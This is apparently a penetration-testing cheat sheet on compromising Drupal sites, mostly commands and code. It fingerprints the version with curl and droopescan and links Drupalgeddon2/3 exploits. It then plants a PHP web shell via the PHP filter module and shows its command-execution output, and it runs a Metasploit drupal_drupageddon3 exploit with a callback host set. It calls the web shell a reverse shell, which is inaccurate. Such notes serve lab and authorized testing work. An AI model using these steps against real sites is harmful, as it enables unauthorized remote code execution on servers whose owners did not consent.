## Drupal

- Check for CVEs
- [Drupalgeddon2](https://www.exploit-db.com/exploits/44448)
- [Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3)

```bash
$ curl -s http://$TARGET | grep Drupal

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>

$ curl -s http://$TARGET/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21


$ curl -s http://$TARGET/CHANGELOG.txt

<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL "http://$TARGET/CHANGELOG.txt" was not found on this server.</p></body></html>

$ droopescan scan drupal -u http://$TARGET
```

In Drupal 8, we can enable PHP filter module

- http://$TARGET/#overlay=admin/modules
- http://$TARGET/#overlay=node/add
- http://$TARGET/#overlay=node/add/page

If we can page, we can put a reverse shell like :
```php
<?php
    system($_GET['cmd']);
?>
```

```bash
curl -s http://$TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can also install php filter module : 
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
http://$TARGET/admin/reports/updates/install
```

Using metasploit : 

```bash
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST $TARGET   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > exploit
```